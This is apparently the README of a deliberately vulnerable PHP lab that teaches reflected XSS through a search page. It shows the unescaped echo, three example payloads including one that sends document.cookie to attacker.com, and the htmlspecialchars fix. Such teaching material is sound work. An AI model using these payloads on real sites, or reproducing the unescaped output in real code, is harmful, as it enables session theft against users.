# Reflected XSS Demo Lab - Gadget Store

This project is a simple PHP-based demo website designed to demonstrate a **Reflected Cross-Site Scripting (XSS)** vulnerability for educational purposes.

## Project Structure
- `index.php`: The homepage with a search bar.
- `search.php`: The search results page where the vulnerability exists.
- `style.css`: Basic styling for the website.
- `script.js`: Simple client-side scripts.

## How it Works
The Gadget Store allows users to search for products using a search bar. When a user submits a search query, they are redirected to `search.php?query=...`, where the results are displayed.

## The Vulnerability: Reflected XSS
Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

### Where it Happens
In `search.php`, the search query is retrieved from the `$_GET['query']` parameter and reflected directly into the HTML without any sanitization or encoding:

```php
<!-- VULNERABLE POINT: The search query is reflected directly back without sanitization -->
<h2>Search results for: <?php echo $query; ?></h2>
```

### How to Exploit It
An attacker can craft a malicious URL that includes a script in the `query` parameter. When a victim clicks on this URL, the script will execute in their browser context.

**Example Payloads:**

1.  **Simple Alert:**
    ```text
    http://localhost:8000/search.php?query=<script>alert('XSS!')</script>
    ```

2.  **Stealing Cookies (Conceptual):**
    ```text
    http://localhost:8000/search.php?query=<script>fetch('https://attacker.com/log?cookie=' + document.cookie)</script>
    ```

3.  **Modifying the DOM:**
    ```text
    http://localhost:8000/search.php?query=<img src=x onerror=alert('Image_XSS')>
    ```

## Running the Lab
Since this is a pure PHP project, you can run it using the built-in PHP development server:

1.  Open your terminal in the project directory.
2.  Run the following command:
    ```bash
    php -S localhost:8000
    ```
3.  Open your browser and navigate to `http://localhost:8000`.

## How to Fix It
To prevent Reflected XSS, all user-provided data must be properly sanitized or encoded before being rendered in the browser. In PHP, you should use `htmlspecialchars()`:

**Corrected Code:**
```php
<h2>Search results for: <?php echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8'); ?></h2>
```

By using `htmlspecialchars`, special characters like `<` and `>` are converted to their HTML entity equivalents (`&lt;` and `&gt;`), preventing the browser from interpreting them as tags.

---
**Disclaimer:** This lab is for educational purposes only. Never use these techniques on websites you do not have permission to test.
